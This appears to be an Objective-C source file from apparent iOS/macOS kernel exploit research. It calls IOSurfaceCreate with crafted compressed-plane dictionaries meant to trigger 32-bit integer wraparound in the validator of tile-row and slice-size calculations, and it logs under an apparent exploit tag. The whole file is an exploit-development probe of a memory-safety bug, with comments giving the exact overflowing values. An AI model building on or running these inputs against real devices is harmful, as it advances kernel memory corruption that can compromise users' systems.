#import "surface_probes.h"
#import <IOSurface/IOSurfaceRef.h>

static NSNumber *u64(uint64_t value)
{
    return [NSNumber numberWithUnsignedLongLong:value];
}

static NSMutableDictionary *compressed_plane(uint64_t bytes_per_tile,
                                             uint64_t bytes_per_tile_row,
                                             uint64_t plane_size,
                                             uint64_t slice_count,
                                             uint64_t data_slice,
                                             uint64_t header_slice)
{
    uint64_t data_total = bytes_per_tile_row;
    uint64_t header_offset = data_total * slice_count;
    return [@{
        @"IOSurfacePlaneWidth": @3,
        @"IOSurfacePlaneHeight": @1,
        @"IOSurfacePlaneBytesPerElement": @1,
        @"IOSurfacePlaneElementWidth": @1,
        @"IOSurfacePlaneElementHeight": @1,
        @"IOSurfaceAddressFormat": @0,
        @"IOSurfacePlaneBytesPerRow": @3,
        @"IOSurfacePlaneSize": u64(plane_size),
        @"IOSurfacePlaneOffset": @0,
        @"IOSurfacePlaneCompressionType": @3,
        @"IOSurfacePlaneCompressionFootprint": @0,
        @"IOSurfacePlaneCompressedTileWidth": @1,
        @"IOSurfacePlaneCompressedTileHeight": @1,
        @"IOSurfacePlaneBytesPerCompressedTileHeader": @32,
        @"IOSurfacePlaneHorizontalPixelOffsetWithinCompressedTileArray": @0,
        @"IOSurfacePlaneVerticalPixelOffsetWithinCompressedTileArray": @0,
        @"IOSurfacePlaneBytesPerTileData": u64(bytes_per_tile),
        @"IOSurfacePlaneWidthInCompressedTiles": @3,
        @"IOSurfacePlaneHeightInCompressedTiles": @1,
        @"IOSurfacePlaneBytesPerRowOfTileData": u64(bytes_per_tile_row),
        @"IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups": @0,
        @"IOSurfacePlaneCompressedTileHeaderRegionOffset": u64(header_offset),
        @"IOSurfacePlaneCompressedTileDataRegionOffset": @0,
        @"IOSurfacePlaneDataRegionBytesPerSlice": u64(data_slice),
        @"IOSurfacePlaneHeaderRegionBytesPerSlice": u64(header_slice),
    } mutableCopy];
}

static NSString *probe_one(NSString *name, NSDictionary *properties)
{
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)properties);
    NSString *result;
    if (surface == NULL) {
        result = [NSString stringWithFormat:@"%@: CREATE_FAILED", name];
    }
    else {
        result = [NSString stringWithFormat:@"%@: OK id=%u alloc=0x%zx width=%zu height=%zu",
                  name, IOSurfaceGetID(surface), IOSurfaceGetAllocSize(surface),
                  IOSurfaceGetWidth(surface), IOSurfaceGetHeight(surface)];
        CFRelease(surface);
    }
    NSLog(@"[KRW27] %@", result);
    return result;
}

NSString *run_surface_probes(void)
{
    NSMutableArray<NSString *> *lines = [NSMutableArray array];
    NSDictionary *baseline = @{
        @"IOSurfacePlaneInfo": @[compressed_plane(1, 3, 3, 1, 3, 0)],
        @"IOSurfaceSliceCount": @1,
    };
    [lines addObject:probe_one(@"baseline compressed type 3", baseline)];

    // 3 * 0xAAAAAAAB == 0x200000001, truncated to 1 by the 32-bit validator.
    NSDictionary *wrap_row = @{
        @"IOSurfacePlaneInfo": @[compressed_plane(0xAAAAAAAB, 1, 1, 1, 1, 0)],
        @"IOSurfaceSliceCount": @1,
    };
    [lines addObject:probe_one(@"K2 wrapped tile row", wrap_row)];

    // 0x10000 * 0x10000 == 0 modulo 2^32. Slice 1 starts exactly at planeSize.
    NSDictionary *wrap_slices = @{
        @"IOSurfacePlaneInfo": @[compressed_plane(0xAAAAAAAB, 1, 0x10000, 0x10000, 0x10000, 0)],
        @"IOSurfaceSliceCount": @0x10000,
    };
    [lines addObject:probe_one(@"K1 wrapped slice total", wrap_slices)];
    return [lines componentsJoinedByString:@"\n"];
}
